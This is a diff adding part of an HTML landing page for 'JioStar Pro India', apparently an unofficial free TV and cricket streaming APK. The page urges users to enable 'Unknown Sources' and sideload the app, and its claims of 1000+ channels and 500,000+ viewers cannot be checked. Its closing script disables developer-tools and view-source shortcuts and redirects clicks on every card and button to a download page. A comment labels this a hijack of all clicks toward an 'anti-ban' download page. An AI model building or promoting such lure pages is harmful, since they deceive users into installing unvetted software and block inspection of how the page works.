+                <div class="card-item"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="BTC%20&%20ETH%20—%20Crypto.jpg"></div><div class="card-title">BTC & ETH — Crypto</div><div class="card-meta">Bitcoin • Ethereum Live</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-hot">LIVE</span><span class="tag-free">FREE</span><img src="Federal%20Reserve%20(FED).jpg"></div><div class="card-title">Oil & Comodities</div><div class="card-meta">WTI · Brent · Natural Gas</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="Forex%20Majors.jpg"></div><div class="card-title">Forex Majors</div><div class="card-meta">EUR/USD • GBP • JPY</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="LBMA%20Gold%20Market.jpg"></div><div class="card-title">LBMA Gold Market</div><div class="card-meta">Gold • Silver Live Prices</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-hot">LIVE</span><span class="tag-free">FREE</span><img src="NYSE%20&%20NASDAQ.jpg"></div><div class="card-title">S&P 500 & Dow Jones</div><div class="card-meta">US Index Trading</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="41.png"></div><div class="card-title">Crypto Banner</div><div class="card-meta">Bitcoin_vs_Ethereum Cryptocurrency</div></div>
+                <div class="card-item"><div class="poster"><span class="tag-vip">NEW</span><span class="tag-free">FREE</span><img src="42.jpg"></div><div class="card-title">Market Trends Poster</div><div class="card-meta">Bitcoin_and_Gold Finance</div></div>
+            </div>
+        </div>
+    </div>
+    <!-- 分隔符 -->
+    <div class="divider"></div>
+    <!-- ================= 7. Why JioStar Pro India 区 ================= -->
+    <div class="why-section">
+        <h2 class="why-title">✨ Why JioStar Pro India?</h2>
+
+        <div class="why-grid">
+            <div class="why-card">
+                <div class="why-icon">📡</div>
+                <div class="why-card-title">1000+ Channels</div>
+                <div class="why-card-text">India and global live TV in one app</div>
+            </div>
+
+            <div class="why-card">
+                <div class="why-icon">🎬</div>
+                <div class="why-card-title">Bollywood Shelf</div>
+                <div class="why-card-text">Movies, serials and premium picks</div>
+            </div>
+
+            <div class="why-card">
+                <div class="why-icon">🏏</div>
+                <div class="why-card-title">Cricket First</div>
+                <div class="why-card-text">IPL, India tours and match nights</div>
+            </div>
+
+            <div class="why-card">
+                <div class="why-icon">🚫</div>
+                <div class="why-card-title">Fast Install</div>
+                <div class="why-card-text">Small APK, quick start, no account</div>
+            </div>
+
+            <div class="why-card">
+                <div class="why-icon">📱</div>
+                <div class="why-card-title">HD / 4K Ready</div>
+                <div class="why-card-text">Clear mobile streaming when available</div>
+            </div>
+
+            <div class="why-card">
+                <div class="why-icon">🌍</div>
+                <div class="why-card-title">India Taste</div>
+                <div class="why-card-text">Hindi, English, sport and cinema</div>
+            </div>
+        </div>
+    </div>
+    <!-- 分隔符 -->
+    <!--    <div class="divider"></div>-->
+
+    <!-- ================= 8. Start Your India TV Room 模块 ================= -->
+    <div class="start-room-section">
+        <h2 class="start-title">Start Your India TV Room</h2>
+        <p class="start-subtitle">Join 500,000+ viewers watching cricket, movies and live TV for free</p>
+
+        <div class="start-stats">
+            <div class="start-stat">
+                <span>1000+</span>
+                <small>CHANNELS</small>
+            </div>
+            <div class="start-stat">
+                <span>130+</span>
+                <small>COUNTRIES</small>
+            </div>
+            <div class="start-stat">
+                <span>4K</span>
+                <small>QUALITY</small>
+            </div>
+        </div>
+
+        <button class="start-btn">
+            <svg width="17" height="17" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+            </svg>
+            Install JioStar Pro APK
+        </button>
+    </div>
+
+    <!-- ================= 9. Quick APK Install Guide 模块 ================= -->
+    <div class="install-guide-section">
+        <h2 class="guide-title">📱 Quick APK Install Guide</h2>
+
+        <div class="guide-list">
+            <div class="guide-step">
+                <div class="step-num">1</div>
+                <div class="step-content">
+                    <h3>Download APK</h3>
+                    <p>Tap download button above. The APK file will save to your phone.</p>
+                </div>
+            </div>
+
+            <div class="guide-step">
+                <div class="step-num">2</div>
+                <div class="step-content">
+                    <h3>Allow Install</h3>
+                    <p>If prompted, go to Settings → Security → Enable "Unknown Sources".</p>
+                </div>
+            </div>
+
+            <div class="guide-step">
+                <div class="step-num">3</div>
+                <div class="step-content">
+                    <h3>Install & Open</h3>
+                    <p>Find APK in Downloads, tap install. Open JioStar Pro and start streaming!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 10. FAQ 常见问题模块 ================= -->
+    <div class="faq-section">
+        <h2 class="faq-title">FAQ</h2>
+
+        <div class="faq-list">
+            <div class="faq-item">
+                <button class="faq-question">
+                    <span>Is JioStar Pro completely free?</span>
+                    <b>+</b>
+                </button>
+                <div class="faq-answer">
+                    Yes, JioStar Pro is designed for free access to selected live TV, movies, sports and entertainment content.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <span>What content is available?</span>
+                    <b>+</b>
+                </button>
+                <div class="faq-answer">
+                    You can find cricket, Bollywood movies, Hindi serials, news, finance, sports and entertainment channels.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <span>Is it safe to install?</span>
+                    <b>+</b>
+                </button>
+                <div class="faq-answer">
+                    Download the APK only from the official page and follow the install guide carefully.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <span>Do I need an account?</span>
+                    <b>+</b>
+                </button>
+                <div class="faq-answer">
+                    No account is required. Install the app, open it and start watching directly.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <span>Which devices work?</span>
+                    <b>+</b>
+                </button>
+                <div class="faq-answer">
+                    JioStar Pro works on most Android phones and Android tablets.
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 页面底部版权 -->
+    <footer class="site-footer">
+        <div class="footer-line"></div>
+        <p>© 2026 JioStar Pro India — Built for the Global Audience</p>
+    </footer>
+    <script>
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode == 123) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 73) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 74) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 67) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.keyCode == 85) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.keyCode == 83) { e.preventDefault(); return false; }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // ================= 1. 丝滑轮播控制逻辑 =================
+            const carousels = document.querySelectorAll('.carousel-container');
+
+            carousels.forEach(carousel => {
+                const track = carousel.querySelector('.carousel-track');
+                const items = Array.from(track.children);
+
+                // 复制节点以实现无缝滚动
+                items.forEach(item => {
+                    const clone = item.cloneNode(true);
+                    track.appendChild(clone);
+                });
+
+                let isUserInteracting = false;
+                let resumeTimeout = null;
+                let exactScroll = 0;
+                const scrollSpeed = parseFloat(carousel.getAttribute('data-speed')) || 0.8;
+
+                function autoScroll() {
+                    if (!isUserInteracting) {
+                        exactScroll += scrollSpeed;
+                        if (exactScroll >= track.scrollWidth / 2) {
+                            exactScroll -= track.scrollWidth / 2;
+                        }
+                        carousel.scrollLeft = exactScroll;
+                    } else {
+                        exactScroll = carousel.scrollLeft;
+                    }
+                    requestAnimationFrame(autoScroll);
+                }
+
+                requestAnimationFrame(autoScroll);
+
+                const handleInteractionStart = () => {
+                    isUserInteracting = true;
+                    clearTimeout(resumeTimeout);
+                };
+
+                const handleInteractionEnd = () => {
+                    clearTimeout(resumeTimeout);
+                    resumeTimeout = setTimeout(() => {
+                        isUserInteracting = false;
+                        exactScroll = carousel.scrollLeft;
+                    }, 2000);
+                };
+
+                carousel.addEventListener('touchstart', handleInteractionStart, {passive: true});
+                carousel.addEventListener('touchmove', handleInteractionStart, {passive: true});
+                carousel.addEventListener('touchend', handleInteractionEnd, {passive: true});
+
+                carousel.addEventListener('mouseenter', handleInteractionStart);
+                carousel.addEventListener('mouseleave', handleInteractionEnd);
+            });
+
+            // ================= 2. FAQ 展开 / 收起逻辑 =================
+            // 作用：点击 FAQ 问题时，展开或隐藏对应答案
+            const faqItems = document.querySelectorAll('.faq-item');
+
+            faqItems.forEach(item => {
+                const question = item.querySelector('.faq-question');
+
+                question.addEventListener('click', () => {
+                    item.classList.toggle('active');
+                });
+            });
+            // ================= 2. 暴力转化：全域劫持跳转防封下载页 =================
+            const nextUrl = "download.html";
+
+            const clickableElements = document.querySelectorAll('.main-btn, .start-btn,.guide-btn, .in-app, .card-item,.fixed-download-btn');
+
+            clickableElements.forEach(el => {
+                el.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    window.location.href = nextUrl;
+                });
+            });
+        });
+
+    </script>
+</div>
+</body>
+</html>
